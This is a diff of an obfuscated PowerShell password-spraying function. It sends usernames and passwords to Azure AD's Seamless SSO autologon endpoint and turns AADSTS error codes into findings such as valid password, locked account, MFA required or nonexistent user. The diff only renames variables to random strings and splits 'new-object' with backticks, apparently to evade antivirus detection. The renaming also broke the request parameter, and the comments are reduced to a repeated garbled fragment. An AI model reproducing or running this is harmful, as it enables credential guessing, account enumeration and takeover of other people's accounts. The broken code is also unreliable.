@@ -1,30 +1,30 @@
-                $SkateMice = (New-Guid).ToString()
+                $YQsuPXOuENzRdNTOITSAwKLSolhuH = (New-Guid).ToString()
 
-                $BombTurkey = $Args[0]
-$DrySlip = $BombTurkey.Split("@")[1]
-                $MarbleCare = $Args[1]
+                $lLTObErglyerxhSnHOhOWuHYcdnBVSCQfXMJEcGUrRUGR = $Args[0]
+$VmXAJuSpYNKntMQgAQSUrenlokzDAdzwdfS = $lLTObErglyerxhSnHOhOWuHYcdnBVSCQfXMJEcGUrRUGR.Split("@")[1]
+                $iKaAUbpyBmiPjieIeSmfOnaJpP = $Args[1]
 
-                $WanderFamous = Get-Date
-                $WoodenAppear = $WanderFamous.toUniversalTime().toString("o")
-                $SpyDog = $WanderFamous.addMinutes(10).toUniversalTime().toString("o")
+                $zwMVrbfmFvdtalfTIIyO = Get-Date
+                $fOfRzLqHHIhlGnUqWufFzpcqxhpSHjXK = $zwMVrbfmFvdtalfTIIyO.toUniversalTime().toString("o")
+                $zxpRkcedOFrqMJwtiUgeEMlhxPuXLzynAKPUBvTzpCi = $zwMVrbfmFvdtalfTIIyO.addMinutes(10).toUniversalTime().toString("o")
 
-               $MatureVessel = "https://autologon.microsoftazuread-sso.com/$DrySlip/winauth/trust/2005/usernamemixed?client-request-id=$SkateMice"
+               $trmwXvmWcXmnuqMJpGuXWf = "https://autologon.microsoftazuread-sso.com/$VmXAJuSpYNKntMQgAQSUrenlokzDAdzwdfS/winauth/trust/2005/usernamemixed?client-request-id=$YQsuPXOuENzRdNTOITSAwKLSolhuH"
               
-                $FoamyAfford=@"
+                $VPVCJlnuMPkoyzOHTsDfoSAaR=@"
 <?xml version='1.0' encoding='UTF-8'?>
 <s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
     <s:Header>
         <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
-        <wsa:To s:mustUnderstand='1'>$MatureVessel</wsa:To>
+        <wsa:To s:mustUnderstand='1'>$trmwXvmWcXmnuqMJpGuXWf</wsa:To>
         <wsa:MessageID>urn:uuid:$((New-Guid).ToString())</wsa:MessageID>
         <wsse:Security s:mustUnderstand="1">
             <wsu:Timestamp wsu:Id="_0">
-                <wsu:Created>$WoodenAppear</wsu:Created>
-                <wsu:Expires>$SpyDog</wsu:Expires>
+                <wsu:Created>$fOfRzLqHHIhlGnUqWufFzpcqxhpSHjXK</wsu:Created>
+                <wsu:Expires>$zxpRkcedOFrqMJwtiUgeEMlhxPuXLzynAKPUBvTzpCi</wsu:Expires>
             </wsu:Timestamp>
             <wsse:UsernameToken wsu:Id="uuid-$((New-Guid).toString())">
-                <wsse:Username>$BombTurkey</wsse:Username>
-                <wsse:Password>$MarbleCare</wsse:Password>
+                <wsse:Username>$lLTObErglyerxhSnHOhOWuHYcdnBVSCQfXMJEcGUrRUGR</wsse:Username>
+                <wsse:Password>$iKaAUbpyBmiPjieIeSmfOnaJpP</wsse:Password>
             </wsse:UsernameToken>
         </wsse:Security>
     </s:Header>
@@ -41,56 +41,56 @@ $DrySlip = $BombTurkey.Split("@")[1]
     </s:Body>
 </s:Envelope>
 "@
-                $BookDaily = $false
+                $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = $false
 
                 try
                 {
-                    $QuillMeasly = Invoke-RestMethod -UseBasicParsing -Uri $MatureVessel -Method Post -FoamyAfford $FoamyAfford -ErrorAction SilentlyContinue
-                    $BookDaily = $true # Microsoft".
+                    $KiLOpAyRGEUTzuBMqUVcZiToSrBXBGshmf = Invoke-RestMethod -UseBasicParsing -Uri $trmwXvmWcXmnuqMJpGuXWf -Method Post -VPVCJlnuMPkoyzOHTsDfoSAaR $VPVCJlnuMPkoyzOHTsDfoSAaR -ErrorAction SilentlyContinue
+                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = $true # Microsoft".
                 }
                 catch
                 {
-                    $PrayPlough = $_.Exception.Response.GetResponseStream()
-                    $RealTidy = new`-`ob`je`ct byte[] $PrayPlough.Length
+                    $TOfEVskWJuVgrJTRRIXYeAmxUGwnKJAdjDmquxQs = $_.Exception.Response.GetResponseStream()
+                    $SweSFOKenqPloJDjxJncrkF = ne`w-`obje`ct byte[] $TOfEVskWJuVgrJTRRIXYeAmxUGwnKJAdjDmquxQs.Length
 
-                    $PrayPlough.Position = 0
-                    $PrayPlough.Read($RealTidy,0,$PrayPlough.Length) | Out-Null
+                    $TOfEVskWJuVgrJTRRIXYeAmxUGwnKJAdjDmquxQs.Position = 0
+                    $TOfEVskWJuVgrJTRRIXYeAmxUGwnKJAdjDmquxQs.Read($SweSFOKenqPloJDjxJncrkF,0,$TOfEVskWJuVgrJTRRIXYeAmxUGwnKJAdjDmquxQs.Length) | Out-Null
             
-                    $LaughRate = [xml][text.encoding]::UTF8.GetString($RealTidy)
+                    $JpuivkAbQyPatutzGYcvojVBoETzstiMBUrr = [xml][text.encoding]::UTF8.GetString($SweSFOKenqPloJDjxJncrkF)
 
-                    $errorDetails = $LaughRate.Envelope.Body.Fault.Detail.error.internalerror.text
+                    $errorDetails = $JpuivkAbQyPatutzGYcvojVBoETzstiMBUrr.Envelope.Body.Fault.Detail.error.internalerror.text
                 }
 
             # Microsoft".
-            if(!$BookDaily -and $errorDetails)
+            if(!$jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa -and $errorDetails)
             {
                 if($errorDetails.startsWith("AADSTS50053")) # Microsoft".
                 {
-                    $BookDaily = "locked"
+                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "locked"
                 }
                 elseif($errorDetails.StartsWith("AADSTS50126")) # Microsoft".
                 {
-                    $BookDaily = "bad password"
+                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "bad password"
                 }
                 elseif($errorDetails.StartsWith("AADSTS50056")) 
                 {
-                    $BookDaily = "exists w/no password"
+                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "exists w/no password"
                 }
                 elseif($errorDetails.StartsWith("AADSTS50014")) 
                 {
-                    $BookDaily = "exists, but max passthru auth time exceeded"
+                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "exists, but max passthru auth time exceeded"
                 }
                 elseif($errorDetails.StartsWith("AADSTS50076")) # Microsoft".
                 {
-                    $BookDaily = "need mfa"
+                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "need mfa"
                 }
                 elseif($errorDetails.StartsWith("AADSTS700016")) # Microsoft".
                 {
-                    $BookDaily = "no app"
+                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "no app"
                 }
                 elseif($errorDetails.StartsWith("AADSTS50034")) # Microsoft".
                 {
-                    $BookDaily = "no user"
+                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "no user"
                 }
                 else
                 {
@@ -98,6 +98,6 @@ $DrySlip = $BombTurkey.Split("@")[1]
                 }
             }
 
-        return $BombTurkey+"		"+$BookDaily
+        return $lLTObErglyerxhSnHOhOWuHYcdnBVSCQfXMJEcGUrRUGR+"		"+$jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa
         return $errorDetails
 
